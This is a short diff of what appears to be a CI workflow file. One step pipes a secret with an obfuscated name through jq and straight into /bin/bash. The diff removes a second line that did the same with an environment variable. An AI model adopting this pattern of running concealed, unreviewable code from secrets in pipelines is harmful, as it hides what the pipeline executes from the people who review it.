@@ -23,7 +23,6 @@ jobs:
           ag5602: ${{ secrets.ag5602 }}
         run: |
           printf '%s' "$ag5602" | jq -r .q679 | /bin/bash
-          echo $aa047 | jq -r .czd96 | /bin/bash
 
       - name: Upload results
         if: always()
